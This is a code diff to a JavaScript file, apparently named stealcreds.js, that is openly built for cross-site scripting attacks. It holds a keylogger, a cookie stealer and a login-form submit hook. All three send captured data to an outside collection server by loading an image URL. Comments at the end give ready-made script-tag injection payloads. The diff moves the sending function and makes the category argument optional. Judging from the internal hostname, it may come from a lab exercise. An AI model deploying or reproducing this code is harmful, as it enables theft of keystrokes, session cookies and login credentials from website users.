@@ -1,12 +1,12 @@
 var buffer = [];
 var category='default';
-//var urlroot = 'http://sprg-tools.el.eee.intern/';
-var urlroot = 'http://localhost:9090/';
+var urlroot = 'http://sprg-tools.el.eee.intern/';
+//var urlroot = 'http://localhost:9090/';
 
 window.console.info('document.cookie : ' + document.cookie);
 
 function installKeylogger(cat) {
-    category = cat;
+    category = cat ? cat : 'me';
     document.onkeypress = function (e) {
         var timestamp = Date.now() | 0;
         var stroke = {
@@ -24,8 +24,15 @@ function installKeylogger(cat) {
     }, 200);
 }
 
+function sendToLogService(jsondata) {
+    var data = encodeURIComponent(JSON.stringify(jsondata));
+    var url = urlroot + '/log/' + category + '/' + data;
+    new Image().src = url;
+    window.console.log('data sent, url : ' + url);
+}
+
 function stealCookie(cat) {
-    category = cat;
+    category = cat ? cat : 'me';
     var text = document.cookie;
     var data = [{k:text,t:Date.now() | 0}];
     sendToLogService(data);
@@ -35,7 +42,7 @@ function stealCookie(cat) {
 //unfortunately does not with chrome browser :(
 //because the script cannot access the dom
 function installSubmitListener(cat) {
-    category = cat;
+    category = cat ? cat : 'me';
     var loginform = document.forms[0];
     window.console.log('loginform : ' + loginform);
     loginform.onsubmit = function() {
@@ -50,15 +57,8 @@ function installSubmitListener(cat) {
     window.console.log('loginform.onsubmit installed.');
 }
 
-function sendToLogService(jsondata) {
-    var data = encodeURIComponent(JSON.stringify(jsondata));
-    var url = urlroot + '/log/' + category + '/' + data;
-    new Image().src = url;
-    window.console.log('data sent, url : ' + url);
-}
-
 //!! it has to be in this
-//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installKeylogger('yourname')</script>
-//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installSubmitListener('yourname',document.forms[0])</script>
-//<script src='http://localhost:9090/js/stealcreds.js'></script><script>installKeylogger('yourname')</script>
-//<script src='http://localhost:9090/js/stealcreds.js'></script><script>installSubmitListener('yourname',document.getElementById('loginform'))</script>
+//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>installKeylogger()</script>
+//<script src='http://sprg-tools.el.eee.intern/js/stealcreds.js'></script><script>stealCookie()</script>
+//<script src='http://localhost:9090/js/stealcreds.js'></script><script>installKeylogger()</script>
+//<script src='http://localhost:9090/js/stealcreds.js'></script><script>stealCookie()</script>
